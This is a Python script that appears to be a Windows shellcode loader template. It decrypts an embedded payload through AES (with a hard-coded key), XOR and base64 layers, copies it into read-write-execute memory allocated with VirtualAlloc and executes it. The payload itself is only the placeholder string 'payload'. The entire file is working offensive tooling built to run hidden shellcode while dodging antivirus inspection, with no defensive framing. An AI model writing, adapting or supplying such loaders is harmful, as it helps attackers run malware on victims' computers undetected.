import base64
import ctypes

from Crypto.Cipher import AES

kernel32 = ctypes.windll.kernel32

def aes_jiemi(s):
    cipher = AES.new(b'LeslieCheungKwok', AES.MODE_ECB)
    return cipher.decrypt(base64.decodebytes(bytes(s, encoding='utf8'))).rstrip(b'\0').decode("utf8")

def xor_jiemi(s,key):
    xor_s = ''
    for i in s:
        xor_s += chr(ord(i) ^ key)
    return xor_s

def write_memory(buf):
    length = len(buf)

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)

    kernel32.RtlMoveMemory.argtypes = (
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t)
    kernel32.RtlMoveMemory(ptr, buf, length)
    return ptr


def run(shellcode):
    buf = ctypes.create_string_buffer(shellcode)
    ptr = write_memory(buf)
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    shell_func()



if __name__ == '__main__':
    jiami_sc = 'payload'
    sc = xor_jiemi(aes_jiemi(jiami_sc),35)
    shde = base64.b64decode(sc)
    run(shde)